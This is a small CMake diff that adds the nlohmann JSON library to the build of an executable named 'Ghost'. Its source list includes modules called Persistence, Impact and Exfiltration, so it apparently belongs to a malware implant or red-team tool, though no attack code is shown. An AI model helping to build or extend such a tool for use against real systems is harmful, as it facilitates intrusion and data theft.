@@ -12,6 +12,9 @@ include(FetchContent)
 FetchContent_Declare(cpr GIT_REPOSITORY https://github.com/libcpr/cpr.git GIT_TAG 1.14.1)
 FetchContent_MakeAvailable(cpr)
 
+FetchContent_Declare(json URL https://github.com/nlohmann/json/releases/download/v3.11.3/json.tar.xz)
+FetchContent_MakeAvailable(json)
+
 # === GLOBAL FLAGS ===
 option(ENABLE_DEBUG "Enable verbose logging" OFF)
 if(ENABLE_DEBUG)
@@ -87,5 +90,5 @@ file(GLOB_RECURSE CORE_SOURCES "src/core/*.cpp" "src/utils/*.cpp" "src/network/*
 list(APPEND CORE_SOURCES src/modules/Persistence.cpp src/modules/Impact.cpp src/modules/Exfiltration.cpp ${MODULE_SOURCES})
 
 add_executable(Ghost ${CORE_SOURCES})
-target_link_libraries(Ghost PRIVATE cpr::cpr)
+target_link_libraries(Ghost PRIVATE cpr::cpr nlohmann_json::nlohmann_json)
 target_include_directories(Ghost PRIVATE include)
